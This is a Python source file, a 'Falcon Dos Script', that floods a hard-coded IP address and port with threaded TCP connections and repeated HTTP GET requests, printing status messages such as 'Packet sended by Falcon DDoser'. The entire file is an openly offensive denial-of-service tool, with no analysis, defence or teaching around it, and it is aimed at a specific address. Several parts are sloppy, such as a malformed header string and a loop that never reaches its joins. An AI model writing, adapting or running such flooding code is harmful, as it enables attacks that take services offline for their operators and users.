#!/usr/bin/env python3

# python 3.3.2+ Falcon Dos Script v.1

from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
from io import StringIO
import time, sys, socket, threading, logging, urllib.request, random

# reading headers
headers = StringIO(
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept: text/html, application/xhtml+xmlAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-alive")
data = headers.read()
headers.close()

# task queue are q,w
q = Queue()
w = Queue()

# Globals
host = '185.209.162.126'
port = 5000
thr = 135
item = 0


# main
def run(target='185.209.162.126', door=5000):
    host = target
    port = door
    print(Fore.GREEN + host, " port: ", str(port), " turbo: ", str(thr), Fore.RESET)
    print(Fore.BLUE + "Please wait..." + Fore.RESET)
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(Fore.RED + "check server ip and port" + Fore.RESET)

    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if item > 1800:  # for no memory crash
                item = 0
                time.sleep(0.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(url, headers={
                'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"})
            print(Fore.BLUE + "bot is hammering" + Fore.RESET)
            time.sleep(0.1)
    except:
        time.sleep(0.1)


def down_it():
    try:
        while True:
            packet = str(
                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14" + "\n" + data).encode(
                'utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print(Fore.GREEN + time.ctime(
                    time.time()) + Fore.RESET + Fore.BLUE + " <--Packet sended by Falcon DDoser--> " + Fore.RESET)
            else:
                s.shutdown(1)
                print(Fore.RED + "off shod<->down" + Fore.RESET)
            time.sleep(0.1)
    except socket.error as e:
        print(Fore.RED + "no connection! server maybe down" + Fore.RESET)
        # print(Fore.RED, e, Fore.RESET)
        time.sleep(0.1)


def dos():
    while True:
        item = q.get()
        down_it()
        q.task_done()
